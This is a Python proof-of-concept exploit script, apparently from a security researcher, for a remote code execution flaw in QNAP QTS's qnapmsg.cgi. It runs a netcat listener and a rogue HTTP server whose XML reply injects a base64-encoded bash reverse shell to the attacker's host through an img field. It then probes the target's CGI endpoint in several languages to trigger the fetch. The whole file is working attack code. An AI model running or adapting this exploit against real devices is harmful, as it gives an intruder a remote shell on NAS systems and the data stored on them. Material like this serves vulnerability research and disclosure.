from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
from functools import partial
import argparse
import requests
import urllib3
import base64
import time
import ssl
import sys
import os  

urllib3.disable_warnings()

def do_banner():
    print("")
    print("01001001001000000110001101100001011011100010011101110100001000000110011101100101") 
    print("    ______  ___      ___  _______   _______   __   ___   __    ___      ___ ")
    print("   /    \" \\|\"  \\    /\"  |/\"     \"| /\"      \\ |/\"| /  \") |\" \\  |\"  |    |\"  |")
    print("  // ____  \\\\   \\  //  /(: ______)|:        |(: |/   /  ||  | ||  |    ||  |")
    print(" /  /    ) :)\\\\  \\/. ./  \\/    |  |_____/   )|    __/   |:  | |:  |    |:  |")
    print("(: (____/ //  \\.    //   // ___)_  //      / (// _  \\   |.  |  \\  |___  \\  |___")
    print(" \\        /    \\\\   /   (:      \"||:  __   \\ |: | \\  \\  /\\  |\\( \\_|:  \\( \\_|:  \\")
    print("  \\\"_____/      \\__/     \\_______)|__|  \\___)(__|  \\__)(__\\_|_)\\_______)\\_______)")
    print("")
    print("01110100001000000111010001101111001000000111001101101100011001010110010101110000")                                               
    print("")
    print("                                🦞 jbaines-r7")
    print("")

class PayloadServer(BaseHTTPRequestHandler):

    def __init__(self, lhost, lport, *args, **kwargs):
        self.payload = base64.b64encode(b'bash -i >& /dev/tcp/' + lhost + b'/' + lport + b' 0>&1')
        super().__init__(*args, **kwargs)

    def do_GET(self):
        print('[+] Received an HTTP request from %s on %s' % (self.address_string(), self.log_date_time_string()))
        print('[*] Requested ' + self.path)
        self.server_version = "Apache"
        self.sys_version = ""
        if self.path.find('/loginad//qnapmsg_') != -1:
            self.send_response(200)
            self.send_header('Content-type', 'text/xml')
            self.end_headers()
            self.wfile.write(b"<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" \
              b"<Root>\n" \
                  b"<Messages>\n" \
                    b"<Message>" \
                      b"<img>/`(echo -ne '" + self.payload + b"' | base64 -d | sh)&`</img>" \
                      b"<link>http://www.qnap.com/</link>" \
                    b"</Message>" \
                  b"</Messages>" \
              b"</Root>\n")
        else:
            self.send_response(404)
            self.end_headers()

##
# Handles a single HTTP request before killing the program.
##
def serve_once(httpd):
    httpd.handle_request()
    os._exit(1)

if __name__ == '__main__':

    do_banner()

    parser = argparse.ArgumentParser(description='QNAP QTS Unknown MITM RCE Vulnerability')
    parser.add_argument('--rhost', action="store", dest="rhost", required=True, help="The IPv4 address to connect to")
    parser.add_argument('--rport', action="store", dest="rport", type=int, help="The port to connect to", default="8080")
    parser.add_argument('--lhost', action="store", dest="lhost", required=True, help="The address to connect back to")
    parser.add_argument('--lport', action="store", dest="lport", type=int, help="The port to connect to", default="1270")
    parser.add_argument('--http_port', action="store", dest="http_port", type=int, help="The port to connect to", default="80")
    parser.add_argument('--nc-path', action="store", dest="ncpath", help="The path to nc", default="/usr/bin/nc")
    parser.add_argument('--protocol', action="store", dest="protocol", help="The protocol handler to use", default="http://")
    args = parser.parse_args()

    pid = os.fork()
    if pid > 0:
        print('[+] Forking a netcat listener')
        print('[+] Using ' + args.ncpath)
        os.execv(args.ncpath, [args.ncpath, '-lvnp ' + str(args.lport)])
        sys.exit(0)
    else:
        # give nc a chance to start up
        time.sleep(1)

    # Spin up a server for the exploit to call back to
    print('[+] Spinning up HTTP server')
    payload_server = partial(PayloadServer, args.lhost.encode('utf-8'), str(args.lport).encode('utf-8'))
    httpd = HTTPServer(("0.0.0.0", args.http_port), payload_server)
    httpd_thread = Thread(target=serve_once, args=(httpd, ))
    httpd_thread.setDaemon(True)
    httpd_thread.start()

    # this isn't all of them but it is sufficient for our purposes
    langs = [ 'eng', 'cze', 'dan', 'ger', 'spa', 'fre', 'ita', 'jpn', 'kor', 'nor', 'pol', 'rus', 'fin', 'swe', 'dut', 'tur', 'tha' ]
    for lang in langs:  
        target_url = args.protocol + args.rhost + ':' + str(args.rport) + '/cgi-bin/qnapmsg.cgi?lang=' + lang
        print('[!] Attempting ' + target_url)
        requests.get(target_url, verify=False, timeout=10)
        
        if httpd_thread.is_alive():
            print('[-] Requested did not trigger a request to our server. Try again.')
        else:
            break

